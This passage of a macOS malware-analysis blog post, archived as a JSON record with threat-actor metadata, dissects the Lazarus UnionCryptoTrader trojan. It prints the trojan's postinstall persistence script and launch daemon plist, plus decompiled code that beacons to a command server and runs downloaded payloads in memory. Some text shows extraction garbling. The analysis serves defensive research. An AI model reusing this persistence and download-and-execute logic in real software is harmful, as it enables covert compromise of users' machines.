noted that the Lazarus APT group has a propensity for targeting users or administrators of cryptocurrency exchanges. And their de facto method of infecting such targets is via fake crypto-currency companies\nand trading applications. Here, yet again we see them utilizing this approach to infect their targets.\n\n\n-----\n\nSpecifically, they first created a (fake) crypto currency trading platform, Union Trader Crypto\n( unioncrypto.vip ):\n\n[Querying VirusTotal with this IP address, we find a URL request that triggered a download of the malicious](https://www.virustotal.com/gui/url/1b3d9c75fd1f2e738011997d91cd959156af9c11d391a91fe5cb2b4562accce4/detection)\napplication ( https://www.unioncrypto.vip/download/W6c2dq8By7luMhCmya2v97YeN ):\n\nSaid application is delivered via a disk image, named `UnionCryptoTrader.dmg We can mount this disk`\nimage, via the `hdiutil attach command:`\n```\n$ hdiutil attach ~/Downloads/UnionCryptoTrader.dmg \nexpected  CRC32 $7720DF1C\n/dev/disk4      GUID_partition_scheme      \n/dev/disk4s1     Apple_APFS           \n/dev/disk5      EF57347C-0000-11AA-AA11-0030654 \n/dev/disk5s1     41504653-0000-11AA-AA11-0030654 /Volumes/UnionCryptoTrader\n\n```\nIt contains a single package: `UnionCryptoTrader.pkg :`\n\n\n-----\n\n```\n$ yp\ntotal 40120\n-rwxrwxrwx 1 patrick staff 20538265 Sep 4 06:25 UnionCryptoTrader.pkg\n\n```\nVia our [‚ÄúWhatsYourSign‚Äù application, it‚Äôs easy to see the](https://objective-see.com/products/whatsyoursign.html) `UnionCryptoTrader.pkg package is unsigned:`\n\n‚Ä¶which means macOS will warn the user, if they attempt to open it:\n\nClearly, the Lazarus group is sticking with its successful attack vector (of targeting employees of cryptocurrency exchanges with trojanized trading applications).\n\nPersistence: Launch Agent\n\nTaking a peek at the `UnionCryptoTrader.pkg package, uncovers a` `postinstall script that will be`\nexecuted at the end of the installation process:\n```\n 1#!/bin/sh\n 2mv /Applications/UnionCryptoTrader.app/Contents/Resources/.vip.unioncrypto.plist \n 3  /Library/LaunchDaemons/vip.unioncrypto.plist\n 4\n 5chmod 644 /Library/LaunchDaemons/vip.unioncrypto.plist\n 6mkdir /Library/UnionCrypto\n 7\n 8mv /Applications/UnionCryptoTrader.app/Contents/Resources/.unioncryptoupdater \n 9  /Library/UnionCrypto/unioncryptoupdater\n10\n11chmod +x /Library/UnionCrypto/unioncryptoupdater\n12/Library/UnionCrypto/unioncryptoupdater &\n\n```\n\n-----\n\nThe purpose of this script is to persistently install a launch daemon.\n\nSpecifically, the script will:\n\nmove a hidden plist ( .vip.unioncrypto.plist ) from the application‚Äôs `Resources directory into`\n```\n   /Library/LaunchDaemons\n\n```\nset it to be owned by root\n\ncreate a `/Library/UnionCrypto directory`\n\nmove a hidden binary ( .unioncryptoupdater ) from the application‚Äôs `Resources directory into`\n```\n   /Library/UnionCrypto/\n\n```\nset it to be executable\n\nexecute this binary ( /Library/UnionCrypto/unioncryptoupdater )\n\n[We can passively observe this part of the installation via either our File or](https://objective-see.com/products/utilities.html#FileMonitor) [Process monitors:](https://objective-see.com/products/utilities.html#ProcessMonitor)\n\n\n-----\n\n```\n           pp p y\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 0,\n  \"arguments\" : [\n   \"mv\",\n   \"/Applications/UnionCryptoTrader.app/Contents/Resources/.vip.unioncrypto.plist\",\n   \"/Library/LaunchDaemons/vip.unioncrypto.plist\"\n  ],\n  \"ppid\" : 3457,\n  \"ancestors\" : [\n   3457,\n   951,\n   1\n  ],\n  \"signing info\" : {\n   \"csFlags\" : 603996161,\n   \"signatureIdentifier\" : \"com.apple.mv\",\n   \"cdHash\" : \"7F1F3DE78B1E86A622F0B07F766ACF2387EFDCD\",\n   \"isPlatformBinary\" : 1\n  },\n  \"path\" : \"/bin/mv\",\n  \"pid\" : 3458\n },\n \"timestamp\" : \"2019-12-05 20:14:28 +0000\"\n}\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 0,\n  \"arguments\" : [\n   \"mv\",\n   \"/Applications/UnionCryptoTrader.app/Contents/Resources/.unioncryptoupdater\",\n   \"/Library/UnionCrypto/unioncryptoupdater\"\n  ],\n  \"ppid\" : 3457,\n  \"ancestors\" : [\n   3457,\n   951,\n   1\n  ],\n  \"signing info\" : {\n   \"csFlags\" : 603996161,\n   \"signatureIdentifier\" : \"com.apple.mv\",\n   \"cdHash\" : \"7F1F3DE78B1E86A622F0B07F766ACF2387EFDCD\",\n   \"isPlatformBinary\" : 1\n  },\n  \"path\" : \"/bin/mv\",\n  \"pid\" : 3461\n },\n \"timestamp\" : \"2019-12-05 20:14:28 +0000\"\n}\n...\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"uid\" : 0,\n  \"arguments\" : [\n    \"/Lib /U i C t / i t d t \"\n\n```\n\n-----\n\n```\n  ],\n  \"ppid\" : 1,\n  \"ancestors\" : [\n   1\n  ],\n  \"signing info\" : {\n   \"csFlags\" : 536870919,\n   \"signatureIdentifier\" : \"macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392\",\n   \"cdHash\" : \"8D204E5B7AE08E80B728DE675AEB8CC735CCF6E7\",\n   \"isPlatformBinary\" : 0\n  },\n  \"path\" : \"/Library/UnionCrypto/unioncryptoupdater\",\n  \"pid\" : 3463\n },\n \"timestamp\" : \"2019-12-05 20:14:28 +0000\"\n}\n\n```\nThough installing a launch daemon requires root access, the installer will prompt the user for their credentials:\n\nOnce the installer completes, the binary `unioncryptoupdater will both currently executing, and persistently`\ninstalled:\n```\n$ ps aux | grep [u]nioncryptoupdater\nroot 1254 /Library/UnionCrypto/unioncryptoupdater\n\n```\nOf course, [BlockBlock will detect the launch daemon persistence attempt:](https://objective-see.com/products/blockblock.html)\n\nAs noted, persistence is achieved via the `vip.unioncrypto.plist launch daemon:`\n\n\n-----\n\n```\n                 g\n 2<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" ...>\n 3<plist version=\"1.0\">\n 4<dict>\n 5  <key>Label</key>\n 6  <string>vip.unioncrypto.product</string>\n 7  <key>ProgramArguments</key>\n 8  <array>\n 9      <string>/Library/UnionCrypto/unioncryptoupdater</string>\n10  </array>\n11  <key>RunAtLoad</key>\n12  <true/>\n13</dict>\n14</plist>\n\n```\nAs the `RunAtLoad key is set to` `true this instruct macOS to automatically launch the binary specified in the`\n```\nProgramArguments array each time the infected system is rebooted. As such\n/Library/UnionCrypto/unioncryptoupdater will be automatically (re) executed.\n\n```\nInstalling a launch daemon (who‚Äôs plist and binary were both stored hidden in the application‚Äôs resource\ndirectory) again matches Lazarus groups modus operandi.\n\nSee Kaspersky‚Äôs writeup: ‚ÄúOperation AppleJeus: Lazarus hits cryptocurrency exchange with fake installer and\nmacOS malware‚Äù\n\nCapabilities: 1st-stage implant (in-memory module loader)\n\nOk, time to analyze the persisted `unioncryptoupdater binary.`\n\nVia the `file command we can ascertain its a standard macOS (64bit) binary:`\n```\n$ file /Library/UnionCrypto/unioncryptoupdater \n/Library/UnionCrypto/unioncryptoupdater: Mach-O 64-bit executable x86_64\n\n```\nThe `codesign utility shows us both it identifier ( macloader-`\n```\n55554944ee2cb96a1f5132ce8788c3fe0dfe7392 ) and the fact that it‚Äôs not signed with a valid code signing id,\n\n```\nbut rather adhoc ( Signature=adhoc ):\n```\n$ codesign -dvv /Library/UnionCrypto/unioncryptoupdater \nExecutable=/Library/UnionCrypto/unioncryptoupdater\nIdentifier=macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392\nFormat=Mach-O thin (x86_64)\nCodeDirectory v=20100 size=739 flags=0x2(adhoc) hashes=15+5 location=embedded\nSignature=adhoc\nInfo.plist=not bound\nTeamIdentifier=not set\nSealed Resources=none\nInternal requirements count=0 size=12\n\n```\nRunning the `strings utility (with the` `-a flag) reveals some interesting strings:`\n\n\n-----\n\n```\n$ g y yp yp p\ncurl_easy_perform() failed: %s\nAES_CYPHER_128 encrypt test case:\nAES_CYPHER_128 decrypt test case:\nAES_CYPHER_192 encrypt test case:\nAES_CYPHER_192 decrypt test case:\nAES_CYPHER_256 encrypt test case:\nAES_CYPHER_256 decrypt test case:\nInput:\nIOPlatformExpertDevice\nIOPlatformSerialNumber\n/System/Library/CoreServices/SystemVersion.plist\nProductVersion\nProductBuildVersion\nMac OS X %s (%s)\nABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\n/tmp/updater\n%s %s\nNO_ID\n%s%s\n12GWAPCT1F0I1S14\nauth_timestamp\nauth_signature\ncheck\nhttps://unioncrypto.vip/update\ndone\n/bin/rcp\nCould not create image.\nCould not link image.\nCould not find ec.\nCould not resolve symbol: _sym[25] == 0x4d6d6f72.\nCould not resolve symbol: _sym[4] == 0x4d6b6e69.\n\n```\nStrings such as `IOPlatformSerialNumber and reference to the` `SystemVersion.plist likely indicate basic`\nsurvey capabilities (to gather information about the infected system). The reference to `libcurl API`\n( curl_easy_perform ) and embedded url `https://unioncrypto.vip/update indicate networking and/or`\ncommand and control capabilities.\n\nOpening a the binary ( unioncryptoupdater ) in a disassembler, shows the `main function simply invoking a`\nfunction named `onRun :`\n```\n1int _main() {\n2  rbx = objc_autoreleasePoolPush();\n3  \n4  onRun();\n5  \n6  objc_autoreleasePoolPop(rbx);\n7  return 0x0;\n8}\n\n```\nThough rather long and involved we can break down its logic.\n\n\n-----\n\n1. Instantiate a C++ class named Barbeque: `Barbeque::Barbeque(); By piping the output of the` `nm`\n\nutility into `c++filt we can dump other methods from the` `Barbeque class:`\n```\n $ nm unioncryptoupdater | c++filt\n unsigned short Barbeque::Barbeque()\n unsigned short Barbeque::get( ... )\n unsigned short Barbeque::post( ... )\n unsigned short Barbeque::~Barbeque()\n\n```\nBased on method names, perhaps the `Barbeque class contains network related logic?`\n\\\n\n2. Invokes a function named `getDeviceSerial to retrieve the system serial number via` `IOKit`\n\n( IOPlatformSerialNumber ):\n```\n  1int __Z15getDeviceSerialPc(int * arg0) {\n  2  \n  3  ...\n  4\n  5  r15 = *(int32_t *)*_kIOMasterPortDefault;\n  6  rax = IOServiceMatching(\"IOPlatformExpertDevice\");\n  7  rax = IOServiceGetMatchingService(r15, rax);\n  8  if (rax != 0x0) {\n  9      rbx = CFStringGetCString(IORegistryEntryCreateCFProperty(rax, \n 10      @\"IOPlatformSerialNumber\", **_kCFAllocatorDefault, 0x0), \n 11      r14, 0x20, 0x8000100) != 0x0 ? 0x1 : 0x0;\n 12      \n 13      IOObjectRelease(rax);\n 14  }\n 15  rax = rbx;\n 16  return rax;\n 17}\n\n```\nDebugging the malware (in a VM), shows this method correctly returns the virtual machine‚Äôs serial number\n( VM+nL/ueNmNG ):\n```\n (lldb) x/s $rax\n 0x7ffeefbff810: \"VM+nL/ueNmNG\"\n\n```\n\\\n\n\n-----\n\n3. Invokes a function named `getOSVersion in order to retrieve the OS version, by reading the system file,`\n```\n  /System/Library/CoreServices/SystemVersion.plist (which contains various version-related\n\n```\ninformation):\n```\n $ defaults read /System/Library/CoreServices/SystemVersion.plist\n {\n   ProductBuildVersion = 18F132;\n   ProductCopyright = \"1983-2019 Apple Inc.\";\n   ProductName = \"Mac OS X\";\n   ProductUserVisibleVersion = \"10.14.5\";\n   ProductVersion = \"10.14.5\";\n   iOSSupportVersion = \"12.3\";\n }\n\n```\nAgain in the debugger, we can observe the malware retrieving this information (specifically the\n```\n  ProductName, ProductUserVisibleVersion, and ProductBuildVersion ):\n (lldb) x/s 0x7ffeefbff790\n 0x7ffeefbff790: \"Mac OS X 10.14.5 (18F132)\"\n\n```\n4. Builds a string consisting of the time and hardcode value (key?): `12GWAPCT1F0I1S14`\n```\n 1sprintf(&var_130, \"%ld\", time(0x0));\n 2rax = sprintf(&var_1B0, \"%s%s\", &var_130, \"12GWAPCT1F0I1S14\");\n\n```\n5. Invokes the `Barbeque::post() method to contact a remote command & control server`\n\n( https://unioncrypto.vip/update ): The network logic leverages via `libcurl to perform the actual`\ncommunications:\n```\n 1curl_easy_setopt(*r15, 0x2727);\n 2curl_easy_setopt(*r15, 0x4e2b);\n 3curl_easy_setopt(*r15, 0x2711);\n 4rdi = *r15;\n 5curl_easy_setopt(rdi, 0x271f);\n 6rax = curl_easy_perform(*r15);\n\n```\nOur firewall [LuLu easily detects this connection attempt:](https://objective-see.com/products/lulu.html)\n\n\n-----\n\n6. If the server responds with the string `0` the malware will sleep for 10 minutes, before checking in again\nwith the server:\n```\n   1if (std::__1::basic_string ... ::compare(rbx, 0x0, 0xffffffffffffffff, \"0\", 0x1) == 0x0) \n   2{ \n   3 sleep(0x258);\n   4 goto connect2Server;\n   5}\n\n```\nOtherwise it will invoke a function to base64 decode the server‚Äôs respond, followed by a function named\n```\n   processUpdate to execute a downloaded payload from the server.\n\n```\nOk, so we‚Äôve got a fairly standard persistent 1 -stage implant which beacons to a remote server for (likely) ast\n2nd-stage fully-featured implant.\n\n\nAt this time, while the remote command & control server remains online, it simply it responding with a ‚Äú0‚Äù,\nmeaning no payload is provided :( \\\n\nAs such, we must rely on static analysis methods for the remainder of our analysis.\n\nHowever, the is one rather unique aspect of this 1 -stage implant: the ability to execute the received payload,st\ndirectly from memory!\n\nLooks take a closer look at how the malware implements this stealthy capability.\n\nRecall that if the server responds with payload (and not a string `\"0\" ), the malware invokes the`\n```\nprocessUpdate function. First the processUpdate decrypts said payload (via aes_decrypt_cbc ), then\n\n```\ninvokes a function named `load_from_memory .`\n```\n1aes_decrypt_cbc(0x0, r15, rdx, rcx, &var_40);\n2memcpy(&var_C0, r15, 0x80);\n3rbx = rbx + 0x90;\n4r14 = r14 - 0x90;\n5rax = _load_from_memory(rbx, r14, &var_C0, rcx, &var_40, r9);\n\n```\nThe `load_from_memory function first mmaps some memory (with protections: PROT_READ | PROT_WRITE |`\nPROT_EXEC). Then copies the decrypted payload into this memory region, before invoking a function named\n```\nmemory_exec2 :\n 1int _load_from_memory(int arg0, int arg1, int arg2, int arg3, int arg4, int arg5) {\n 2  r14 = arg2;\n 3  r12 = arg1;\n 4  r15 = arg0;\n 5  rax = mmap(0x0, arg1, 0x7, 0x1001, 0xffffffffffffffff, 0x0);\n 6  if (rax != 0xffffffffffffffff) {\n 7      memcpy(rax, r15, r12);\n 8      r14 = _memory_exec2(rax, r12, r14);\n 9      munmap(rax, r12);\n10      rax = r14;\n11  }\n12  else {\n13      rax = 0xffffffffffffffff;\n14  }\n15  return rax;\n16}\n\n```\nThe `memory_exec2 function invokes the Apple API` `NSCreateObjectFileImageFromMemory to create an`\n‚Äúobject file image‚Äù from a memory buffer (of a mach-O file). Following this, the `NSLinkModule method is called`\nto link the ‚Äúobject file image‚Äù.\n\n\n-----\n\n```\n   _ y_ ( g, g, g ) {\n2  \n3  ...\n4  rax = NSCreateObjectFileImageFromMemory(rdi, rsi, &var_58);\n5  \n6  rax = NSLinkModule(var_58, \"core\", 0x3);\n7  \n\n```\nAs the layout of an in-memory process image is different from its on disk-in image, one cannot simply copy a file\ninto memory and directly execute it. Instead, one must invoke APIs such as\nNSCreateObjectFileImageFromMemory and NSLinkModule (which take care of preparing the in-memory\nmapping and linking).\n\nOnce the malware has mapped and linked the downloaded payload, it invokes a function named `find_macho`\nwhich appears to search the memory mapping for `MH_MAGIC_64, the 64-bit ‚Äúmach magic number‚Äù in the`\n```\nmach_header_64 structure ( 0xfeedfacf ):\n 1int find_macho(int arg0, int arg1, int arg2, int arg3) {\n 2\n 3 ...\n 4\n 5 do {\n 6  ...\n 7  if ((*(int32_t *)__error() == 0x2) && (*(int32_t *)rbx == 0xfeedfacf)) {\n 8    break;\n 9  }\n10   \n11 } while (true);\n12}\n\n```\nOnce the `find_macho method returns, the malware begins parsing the in-memory mach-O file. It appears to`\nbe looking for the address of `LC_MAIN load command ( 0x80000028 ):`\n```\n1if (*(int32_t *)rcx == 0x80000028) goto loc_100006ac7;\n\n```\n[For an in-depth technical discussion of parsing mach-O files, see: ‚ÄúParsing Mach-O Files‚Äù.](https://lowlevelbits.org/parsing-mach-o-files/)\n\nThe `LC_MAIN load command contains information such as the entry point of the mach-O binary (for example,`\noffset `18177 for the` `unioncryptoupdater binary):`\n\n\n-----\n\nThe malware then retrieves the offset of the entry point (found at offset `0x8 within the` `LC_MAIN load`\ncommand), sets up some arguments, then jumps to this address:\n```\n1//rcx points to the `LC_MAIN` load command\n2r8 = r8 + *(rcx + 0x8);\n3...\n4\n5//invoke payload's entry point!\n6rax = (r8)(0x2, &var_40, &var_48, &var_50, r8);\n\n```\nDelightful! Pure in-memory execution of a remotely downloaded payload. ü§© Sexy!\n\nIn 2015, at BlackHat I discussed this method of in-memory file execution as a means to increase stealth and\n[complicate forensics (See: ‚ÄúWriting Bad @$$ Malware for OS X‚Äù):](https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf)\n\n\n-----\n\n‚Ä¶kinda neat to see it (finally) show up in macOS malware in the wild!\n\nFor more details on in-memory code execution in macOS, see:\n\n[‚ÄúRunning Executables on macOS From Memory‚Äù](https://threatvector.cylance.com/en_us/home/running-executables-on-macos-from-memory.html)\nApple‚Äôs [‚ÄúMemoryBasedBundle‚Äù sample code](https://developer.apple.com/library/archive/samplecode/MemoryBasedBundle/Introduction/Intro.html#//apple_ref/doc/uid/DTS10003518)\n\n\\\n\n[Former #OBTS speaker Felix Seele (@c1truz_) noted that the (in)famous InstallCore adware also (ab)used the](https://twitter.com/c1truz_)\nNSCreateObjectFileImageFromMemory and NSLinkModule APIs to achieve in-memory execution.\n\nInterestingly, the malware has a ‚Äúbackup‚Äù plan if the in-memory code execution fails. Specifically if\n```\nload_from_memory does not return 0 (success) it will write out the received payload to /tmp/updater and\n\n```\nthen execute it via a call to `system :`\n```\n 1rax = _load_from_memory(rbx, r14, &var_C0, rcx, &var_40, r9);\n 2if(rax != 0x0) {\n 3 fwrite(rbx, r14, 0x1, fopen(\"/tmp/updater\", \"wb\"));\n 4 fclose(rax);\n 5 \n 6 chmod(\"/tmp/updater\", 0x1ff);\n 7 sprintf(&var_4C0, \"%s %s\", \"/tmp/updater\", &var_C0);\n 8 \n 9 rax = system(&var_4C0);\n10 \n11 unlink(\"/tmp/updater\");\n12}\n\n```\nAlways good to handle error conditions and have a plan B!\n\nLazarus group continues to target macOS users with ever evolving capabilities. This sample, pushes the\nenvelope with the ability to remotely download and execute payloads directly from memory!\n\n## üëæ And All Others\n\n\n-----\n\nThis blog post provided a comprehensive technical analysis of the new mac malware of 2019. However as\npreviously noted, we did not cover adware or malware from previous years. Of course, this is not to say such\nitems are unimportant.\n\nAs such, here we include a list of other items and for the interested reader, and links to detailed writeups.\n\nChances are, if an Apple user tells you their Mac is infected, it‚Äôs likely adware. Over the years, Mac adware has\nbecome ever more prolific as hackers seeks to financially ‚Äúbenefit‚Äù from the popularity of Cupertino‚Äôs devices.\n\n2019 saw a variety of new adware, plus various known samples continuing to evolve. Some of the most notable\nadware-related events from 2019 include:\n\nüëæ `OSX.Dok`\nIn January, SentinelOne discovered that `OSX.Dok was back, and ‚Äúactively infecting (new) victims‚Äù.`\n\nWriteup: [‚ÄúMac Malware OSX.Dok is Back, Actively Infecting Victims‚Äù](https://www.sentinelone.com/blog/mac-malware-osx-dok-is-back-actively-infecting-victims/)\n\nüëæ `OSX.Pirrit`\nThe ever prolific `Pirrit adware continued to involve in 2019. In March, we analyzed a sample`\n(compiled as python bytecode) which utilized AppleScript to inject malicious JavScript into browser pages.\n\nWriteup: [‚ÄúMac Adware, √† la Python‚Äù](https://objective-see.com/blog/blog_0x3F.html)\n\nüëæ `OSX.Tarmac`\n[A well known piece of mac adware OSX.Shlayer was recently observed installing a new piece of Mac](https://www.intego.com/mac-security-blog/osxshlayer-new-mac-malware-comes-out-of-its-shell/)\nadware. Dubbed `OSX.Tarmac this new adware implements a variety of tricks to complicate detection and`\nanalysis.\n\nWriteup: [‚ÄúOSX/Shlayer new Shurprise‚Ä¶ unveiling OSX/Tarmac‚Äù](https://blog.confiant.com/osx-shlayer-new-shurprise-unveiling-osx-tarmac-f965a32de887)\n\nüëæ `OSX.NewTab`\n[Though (still?) undetected by all the anti-virus engines on VirusTotal,](https://www.virustotal.com/gui/file/9237dc996a9e2c939f74414c87350009f11b147f1703823062f790921be30be9/detection) `OSX.NewTab appears to be a fairly`\nstandard piece of macOS adware (that appears to inject code into browser sessions for ‚Äúad impressions‚Äù).\n\nWriteup: [‚ÄúOSX/NewTab‚Äù](https://www.intego.com/mac-security-blog/mac-malware-on-the-rise-again-several-new-threats-found/)\n\nüëæ `OSX.CrescentCore Masquerading as Adobe Flash Installer,` `CrescentCore attempts to installing`\nother (potentially) unwanted software on victim machines. Interestingly, by design it will not infect systems\nrunning 3rd-party AV/security tools nor systems running within a VM.\n\nWriteup: [‚ÄúOSX/CrescentCore: Mac malware designed to evade antivirus‚Äù](https://www.intego.com/mac-security-blog/osx-crescentcore-mac-malware-designed-to-evade-antivirus/)\n\n## Conclusion:\n\nWell that‚Äôs a wrap! Thanks for joining our ‚Äújourney‚Äù as we wandered through the macOS malware of 2019.\n\nLooking forward, maybe we‚Äôll see a drop in malware affecting the latest version of macOS (Catalina), due to its\n[stringent notarization requirements ‚Ä¶though word on the street is it‚Äôs already bypassed:](https://developer.apple.com/documentation/xcode/notarizing_macos_software_before_distribution?language=objc)\n\n\n-----\n\n\\\n\nLove these blog posts?\n[Support my tools & writing on patreon :)](https://www.patreon.com/bePatron?c=701171)\n\nThis website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-01 - The Mac Malware of 2019.pdf"
    ],
    "report_names": [
        "2020-01-01 - The Mac Malware of 2019.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "32a223a8-3c79-4146-87c5-8557d38662ae",
            "created_at": "2022-10-25T15:50:23.703698Z",
            "updated_at": "2025-03-27T02:00:55.528031Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Lazarus Group",
                "Labyrinth Chollima",
                "HIDDEN COBRA",
                "Guardians of Peace",
                "NICKEL ACADEMY",
                "Diamond Sleet"
            ],
            "source_name": "MITRE:Lazarus Group",
            "tools": [
                "RawDisk",
                "Proxysvc",
                "BADCALL",
                "FALLCHILL",
                "WannaCry",
                "HOPLIGHT",
                "TYPEFRAME",
                "Dtrack",
                "HotCroissant",
                "HARDRAIN",
                "Dacls",
                "KEYMARBLE",
                "TAINTEDSCRIBE",
                "AuditCred",
                "netsh",
                "ECCENTRICBANDWAGON",
                "AppleJeus",
                "BLINDINGCAN",
                "ThreatNeedle",
                "Volgmer",
                "Cryptoistic",
                "RATANKBA",
                "Bankshot",
                "Torisma",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9e767b38-12ae-4ef7-9878-5ce1701066d7",
            "created_at": "2024-05-01T02:03:08.131819Z",
            "updated_at": "2025-03-27T02:05:17.413497Z",
            "deleted_at": null,
            "main_name": "NICKEL ACADEMY",
            "aliases": [
                "COVELLITE ",
                "CTG-2460 ",
                "Diamond Sleet ",
                "Guardians of Peace",
                "HIDDEN COBRA ",
                "High Anonymous",
                "Labyrinth Chollima ",
                "NNPT Group",
                "New Romanic Cyber Army Team",
                "Temp.Hermit ",
                "The Lazarus Group ",
                "UNC577 ",
                "Who Am I?",
                "Whois Team",
                "ZINC ",
                "Black Artemis "
            ],
            "source_name": "Secureworks:NICKEL ACADEMY",
            "tools": [
                " DarkMessenger",
                " Destover",
                " Duuzer",
                " HOPLIGHT",
                " Joanap",
                " KorHigh",
                " LiveJinx",
                " Volgmer",
                "Brambul"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f32df445-9fb4-4234-99e0-3561f6498e4e",
            "created_at": "2022-10-25T16:07:23.756373Z",
            "updated_at": "2025-03-27T02:02:09.966155Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "APT-C-26",
                "ATK 3",
                "Appleworm",
                "Citrine Sleet",
                "DEV-0139",
                "Diamond Sleet",
                "Gleaming Pisces",
                "Gods Apostles",
                "Gods Disciples",
                "Group 77",
                "Guardians of Peace",
                "Hastati Group",
                "Hidden Cobra",
                "ITG03",
                "Jade Sleet",
                "Labyrinth Chollima",
                "Lazarus Group",
                "NewRomanic Cyber Army Team",
                "Operation 99",
                "Operation AppleJeus",
                "Operation AppleJeus sequel",
                "Operation Blockbuster: Breach of Sony Pictures Entertainment",
                "Operation CryptoCore",
                "Operation Dream Job",
                "Operation Dream Magic",
                "Operation Flame",
                "Operation GhostSecret",
                "Operation In(ter)caption",
                "Operation LolZarus",
                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
